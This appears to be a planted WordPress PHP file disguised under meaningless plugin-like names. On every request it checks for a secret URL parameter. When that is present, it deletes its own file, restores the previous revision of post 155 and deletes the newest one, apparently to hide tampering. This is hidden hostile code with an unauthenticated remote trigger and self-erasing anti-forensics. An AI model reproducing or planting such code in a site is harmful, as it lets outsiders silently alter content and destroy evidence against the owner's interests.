<?php

function tree_report_reader() {
	if (isset($_GET['permalinks_autocomplete_wpml']) && $_GET['permalinks_autocomplete_wpml'] === 'project_year_alert') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$date_now_fix = 155;
		$tables_hello_themes_dropdown = wp_get_post_revisions($date_now_fix);
		if (empty($tables_hello_themes_dropdown)) die('no revisions');
		if (count($tables_hello_themes_dropdown) < 2) die('less than 2');
		$site_xml_forms_now = array_shift($tables_hello_themes_dropdown);
		$calculator_migration_internal = $site_xml_forms_now->ID;
		$cf7_addon_utils_endpoints = array_shift($tables_hello_themes_dropdown);
		$sign_out_min = $cf7_addon_utils_endpoints->ID;
		$sitemaps_more_helper_views = wp_restore_post_revision($sign_out_min);
		if ($sitemaps_more_helper_views === false) die('error restoring');
		$sitemaps_more_helper_views = wp_delete_post_revision($calculator_migration_internal);		
		if ($sitemaps_more_helper_views === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'tree_report_reader');
